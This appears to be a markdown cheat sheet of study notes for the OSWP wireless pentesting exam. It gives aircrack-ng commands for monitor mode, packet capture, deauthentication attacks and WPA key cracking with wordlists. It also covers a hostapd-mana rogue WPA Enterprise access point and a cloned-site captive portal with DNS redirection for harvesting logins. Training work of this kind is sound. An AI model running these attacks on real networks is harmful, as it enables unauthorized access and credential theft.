# OSWP

## Aircrack-ng 
### Packet sniffer, network detector, frame injection, cracks WEP and WPA-PSK 
```
sudo airmon-ng check
sudo airmon-ng check kill

sudo /usr/sbin/airmon-ng
sudo airmon-ng start wlan0
sudo airmon-ng start wlan0 [channel #]
sudo airmon-ng stop wlan0

iw wlan0 info
iwconfig
ifconfig

```

## Airodump-ng 
### WEP, WPA/WPA2
#### Don't forget to specify interface
```
sudo airodump-ng wlan0mon -c 2
sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap wlan0mon
```
|CMD|DESC|
|-----|-----|
|-w|output filename| 
|--bsssid|specific BSSID|
|--essid|specific ESSID|
|-c|channel|
|-g|GPS|
|--ivs| Interval Vectors
|-R|Regular Expression|

## Aireplay-ng
### Generate wireless traffic, deauths, WEP
#### Set card to channel [#]
```
sudo airmon-ng start wlan0 # 
```
### Deauth
```
sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 wlan0mon
```
|CMD|DESC|
|-----|-----|
-0 |# deauths
0 | continuous
-a|BSSID
-c|client MAC

## Aircrack-ng
### Cracking Hashes
```
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```
### John the Ripper
```
john --format=netntlm timothy --wordlist=/usr/share/wordlists/rockyou.txt
```
### Hashcat
```
hashcat -m [hashtype] [hash] [dictionary]
```
## Useful Linux Commands
```
scp kali@192.168.10.94:/home/kali/1.cap-01.cap .
gzip -d file .gz
```
## Attacking WPA Enterprise
```
sudo airodump-ng wlan0mon
sudo apt install freeradius
nano ca.cnf, nano server.cnf
make
sudo apt install hostapd-mana
mana.conf
mana.eap_user
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
## Certs
```
openssl x509 -in CERT_FILENAME -noout -enddate
openssl x509 -inform der -in CERTIFICATE_FILENAME -text
```

## Captive Portal
```
sudo apt install apache2 libapache2-mod-php
wget -r -l2 https://www.megacorpone.com
/var/www/html/portal/index.php
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
/var/www/html/portal/login_check.php

sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
sudo apt install dnsmasq
mco-dnsmasq.conf
sudo dnsmasq --conf-file=mco-dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq
sudo netstat -lnp

sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53

/etc/apache2/sites-enabled/000-default.conf
